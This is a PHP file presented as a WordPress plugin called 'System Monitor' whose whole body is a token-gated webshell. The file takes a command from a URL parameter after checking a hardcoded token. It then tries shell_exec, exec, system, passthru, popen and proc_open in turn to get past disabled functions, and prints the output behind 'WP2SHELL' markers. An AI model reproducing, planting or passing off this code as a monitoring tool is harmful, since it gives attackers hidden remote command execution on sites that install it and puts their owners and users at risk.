<?php
/*
Plugin Name: System Monitor
Description: System monitoring utilities
Version: 1.0
Author: Admin
*/

// Token-gated webshell with fallback methods
$token = 'b0adeab1e9121b3281f9db6d4e6da6b5';
$input_token = isset($_GET['t']) ? (string)$_GET['t'] : '';

if ($token === $input_token && isset($_GET['c'])) {
    $cmd = (string)$_GET['c'];
    $output = '';
    
    // Try multiple execution methods
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', @ini_get('disable_functions')))) {
        $output = @shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec') && !in_array('exec', explode(',', @ini_get('disable_functions')))) {
        @exec($cmd . ' 2>&1', $arr);
        $output = implode("\n", $arr);
    } elseif (function_exists('system') && !in_array('system', explode(',', @ini_get('disable_functions')))) {
        ob_start();
        @system($cmd . ' 2>&1');
        $output = ob_get_clean();
    } elseif (function_exists('passthru') && !in_array('passthru', explode(',', @ini_get('disable_functions')))) {
        ob_start();
        @passthru($cmd . ' 2>&1');
        $output = ob_get_clean();
    } elseif (function_exists('popen') && !in_array('popen', explode(',', @ini_get('disable_functions')))) {
        $fp = @popen($cmd, 'r');
        if ($fp) {
            while (!feof($fp)) $output .= fread($fp, 1024);
            @pclose($fp);
        }
    } elseif (function_exists('proc_open') && !in_array('proc_open', explode(',', @ini_get('disable_functions')))) {
        $desc = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
        $proc = @proc_open($cmd, $desc, $pipes);
        if (is_resource($proc)) {
            fclose($pipes[0]);
            while (!feof($pipes[1])) $output .= fread($pipes[1], 1024);
            fclose($pipes[1]);
            fclose($pipes[2]);
            @proc_close($proc);
        }
    } else {
        $output = '[BLOCKED] All execution functions disabled';
    }
    
    echo 'WP2SHELL::' . $output . '::END';
}
?>